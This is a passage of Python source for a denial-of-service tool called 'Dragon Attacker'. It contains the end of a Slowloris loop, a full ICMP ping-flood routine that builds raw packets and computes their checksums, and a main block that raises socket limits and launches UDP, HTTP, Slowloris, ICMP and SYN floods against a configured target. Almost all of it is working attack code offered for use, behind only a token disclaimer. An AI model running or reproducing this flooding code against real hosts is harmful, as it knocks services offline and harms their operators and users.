                        new_sock.settimeout(4)
                        new_sock.connect((target_ip, target_port))
                        
                        if is_https:
                            new_sock = ssl.create_default_context().wrap_socket(
                                new_sock, server_hostname=hostname)
                        
                        new_sock.send(f"GET / HTTP/1.1\r\nHost: {hostname}\r\n".encode())
                        sockets_list.append(new_sock)
                        
                        if counters is not None:
                            counters['connections'] = counters.get('connections', 0) + 1
                            
                    except socket.error:
                        if counters is not None:
                            counters['errors'] = counters.get('errors', 0) + 1
                        pass  # Couldn't replace the socket
            
            # Log the current status
            logger.debug(f"Maintaining {len(sockets_list)} Slowloris connections")
            
            # Sleep between each round
            time.sleep(15)  # Keep connections alive every 15 seconds
            
    except KeyboardInterrupt:
        logger.info("Slowloris attack interrupted")
    finally:
        # Clean up all sockets
        for sock in sockets_list:
            try:
                sock.close()
            except:
                pass
                
def icmp_flood(target_info, counters=None):
    """Launch an ICMP flood (ping flood) attack."""
    target_ip, _ = target_info  # Port is not used for ICMP
    
    # Check if we have root privileges, which are required for raw sockets
    if os.geteuid() != 0:
        logger.error("ICMP flood requires root privileges")
        print(f"{Colors.RED}ICMP flood attack requires root privileges. Skipping.{Colors.RESET}")
        if counters is not None:
            counters['errors'] = counters.get('errors', 0) + 1
        return
    
    logger.info(f"Starting ICMP flood against {target_ip}")
    
    try:
        # Create a raw socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        # ICMP echo request packet
        icmp_type = 8  # Echo request
        icmp_code = 0
        icmp_checksum = 0
        icmp_id = os.getpid() & 0xFFFF
        icmp_seq = 1
        
        sent = 0
        
        while True:
            # Create packet with random data
            packet_size = random.randint(64, 1024)
            payload = os.urandom(packet_size - 8)  # 8 bytes for ICMP header
            
            # Create ICMP header
            icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
            
            # Calculate checksum
            checksum = 0
            for i in range(0, len(icmp_header + payload), 2):
                if i + 1 < len(icmp_header + payload):
                    checksum += (icmp_header + payload)[i] + ((icmp_header + payload)[i+1] << 8)
                else:
                    checksum += (icmp_header + payload)[i]
            checksum = (checksum >> 16) + (checksum & 0xFFFF)
            checksum = ~checksum & 0xFFFF
            
            # Rebuild header with correct checksum
            icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, icmp_id, icmp_seq)
            
            # Send the packet
            sock.sendto(icmp_header + payload, (target_ip, 0))
            
            if counters is not None:
                counters['packets_sent'] = counters.get('packets_sent', 0) + 1
                counters['bytes_sent'] = counters.get('bytes_sent', 0) + len(icmp_header + payload)
            
            sent += 1
            if sent % 1000 == 0:
                logger.debug(f"Sent {sent} ICMP packets to {target_ip}")
            
            # Increment sequence number
            icmp_seq = (icmp_seq + 1) % 65536
            
            # Small delay to prevent tight loop
            time.sleep(0.001)
            
    except PermissionError:
        logger.error("ICMP flood requires root privileges")
        print(f"{Colors.RED}ICMP flood attack requires root privileges. Skipping.{Colors.RESET}")
        if counters is not None:
            counters['errors'] = counters.get('errors', 0) + 1
    except Exception as e:
        logger.error(f"ICMP flood error: {e}")
        if counters is not None:
            counters['errors'] = counters.get('errors', 0) + 1
    finally:
        sock.close()

def save_config(config):
    """Save configuration to config.json file."""
    try:
        with open("config.json", "w") as config_file:
            json.dump(config, config_file, indent=2)
            logger.info("Configuration saved to config.json")
    except Exception as e:
        logger.error(f"Error saving configuration: {e}")

if __name__ == "__main__":
    # Print the banner
    print_banner()
    
    # Display warning and get confirmation
    display_legal_disclaimer()
    
    # Check for root privileges and display warning if not running as root
    if os.geteuid() != 0:
        print(f"\n{Colors.YELLOW}WARNING: Not running as root/administrator.{Colors.RESET}")
        print(f"{Colors.YELLOW}Some attack methods may not work correctly.{Colors.RESET}")
        print(f"{Colors.YELLOW}For full functionality, consider running with elevated privileges.{Colors.RESET}\n")
    
    # Try to increase system limits for performance
    try:
        # Increase socket limit
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        if soft < 4096 and hard >= 4096:
            resource.setrlimit(resource.RLIMIT_NOFILE, (4096, hard))
            logger.info(f"Increased open file limit from {soft} to 4096")
    except Exception as e:
        logger.warning(f"Couldn't increase system limits: {e}")
    
    # Configure logging
    logger.info("Dragon Attacker started")
    
    # Load configuration
    global config
    config = load_or_ask_config()
    
    # Save the configuration for next time
    save_config(config)
    
    # Set up attack methods
    attack_methods = [
        udp_flood,
        http_flood,
        slowloris,
        icmp_flood,
        tcp_syn_flood
    ]
    
    if os.geteuid() == 0:  # Add attacks that require root privileges
        attack_methods.append(tcp_syn_flood)
    
    # Start the attack
    try:
        attack(attack_methods, config)
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Attack interrupted by user. Cleaning up...{Colors.RESET}")
    except Exception as e:
        logger.error(f"Unexpected error during attack: {e}")
        print(f"\n{Colors.RED}Error: {e}{Colors.RESET}")
        traceback.print_exc()
    finally:
        print(f"\n{Colors.GREEN}Dragon Attacker complete. Thank you for using our tool.{Colors.RESET}")
        logger.info("Dragon Attacker finished")
